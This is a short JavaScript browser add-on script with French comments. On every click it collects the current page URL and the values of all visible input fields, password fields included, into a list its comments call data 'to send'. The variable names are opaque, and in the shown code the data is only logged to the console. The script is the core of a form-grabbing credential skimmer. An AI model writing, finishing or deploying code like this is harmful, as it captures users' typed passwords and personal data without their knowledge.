"use strict";

console.log('demarrage de mon addon');

/*************************************************************/
/*            DE 1001->1010 variables temporaires            */
/* clef1000 = liste de tout les input                        */
/* clef1001 = compteur temporaire                            */
/* clef1002 = site visité                                    */
/* clef1003 = liste avec les values des input                                      */
/*             DE 1011->1021 variables à envoyer             */
/* clef1011 = liste avec toutes les info à envoyer                                              */
/* clef1011 = [[site visité],[tous les input de la page]]                                               */
/* clef1007 =                                                */
/* clef1008 =                                                */
/* clef1009 =                                                */
/*************************************************************/

document.addEventListener('click', function(event){
	event.preventDefault;
	var clef1002 = document.location.href;
	var clef1003 = [];
	var clef1000 = Array.prototype.slice.call(document.getElementsByTagName('input'),0)
	for (let clef1001=0; clef1001!=clef1000.length ; clef1001++){
		if (clef1000[clef1001].getAttribute("type") != "hidden"){
			clef1003.push(clef1000[clef1001].value);
		}
	}
	var clef1011 = [clef1002];
	clef1011.push(clef1003);
	console.log(clef1011);
});